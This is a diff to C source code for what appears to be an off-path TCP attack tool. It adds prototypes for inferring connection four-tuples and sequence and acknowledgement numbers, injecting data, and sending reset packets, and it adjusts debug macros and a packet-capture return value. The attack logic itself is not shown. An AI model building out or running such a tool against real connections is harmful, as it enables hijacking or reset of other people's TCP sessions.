@@ -137,6 +137,17 @@ static packet_t g_rst_pkt;
 /* prototypes.. */
 int set_up_attack(void);
 
+int sync_time_with_remote(void);
+int infer_four_tuple(void);
+int infer_sequence_step1(u_long *pstart, u_long *pend);
+int infer_sequence_step2(u_long *pstart, u_long *pend);
+int infer_sequence_step3(u_long *pstart, u_long *pend);
+int infer_sequence_step3_ack(u_long *pstart, u_long *pend);
+int infer_sequence_number(void);
+int infer_ack_number(void);
+int inject_the_data(void);
+int conduct_offpath_attack(void);
+
 uint16_t in_cksum(uint16_t *addr, size_t len);
 void tcp_init(volatile conn_t *pconn, uint32_t seq);
 int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn,
@@ -145,7 +156,7 @@ int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags,
 		char *data, size_t len);
 int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags,
 		uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen);
-#ifdef DEBUG_SEQ
+#if defined(DEBUG_SEQ_IN) || defined(DEBUG_SEQ_OUT)
 char *tcp_flags(u_char flags);
 #endif
 
@@ -156,8 +167,16 @@ void setterm(int mode);
 int kbhit(void);
 
 int lookup_host(char *hostname, struct sockaddr_in *addr);
+
 int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv,
 		uint16_t lport, int *off2ip);
+
+void *recv_thread(void *arg);
+int send_packets_delay(packet_t *ppkt, int count, suseconds_t us_delay);
+int prepare_rst_packet(packet_t *ppkt);
+
+void wait_until(const char *desc, struct timeval *pstart, time_t sec,
+		suseconds_t usec);
 
 char *slurp(char *file, off_t *plen);
 
@@ -520,7 +539,7 @@ int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv, uint16_t lport,
 
 	  case DLT_FDDI:
 		   fprintf(stderr, "[!] FDDI is not supported!\n");
-		   return 1;
+		   return 0;
 
 	  case DLT_RAW:
 		   fprintf(stderr, "[-] Using the RAW datalink.\n");
@@ -540,6 +559,7 @@ int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv, uint16_t lport,
 	   if (pcap_setfilter(*pcap, &bpfp) == -1)
 		   return 0;
    }
+
    return 1;
 }
 
@@ -2247,7 +2267,7 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 
 	*outlen = ((void *)ptr - output) + len;
 
-#ifdef DEBUG_SEQ
+#ifdef DEBUG_SEQ_OUT
 	{
 		char shost[32], dhost[32];
 
@@ -2334,7 +2354,7 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t
 	}
 	datalen -= (iplen + tcplen);
 
-#ifdef DEBUG_SEQ
+#ifdef DEBUG_SEQ_IN
 	{
 		char shost[32], dhost[32];
 
@@ -2375,7 +2395,7 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, uint32_t
 }
 
 
-#ifdef DEBUG_SEQ
+#if defined(DEBUG_SEQ_IN) || defined(DEBUG_SEQ_OUT)
 /*
  * return a string showing which flags are set in the TCP packet
  *
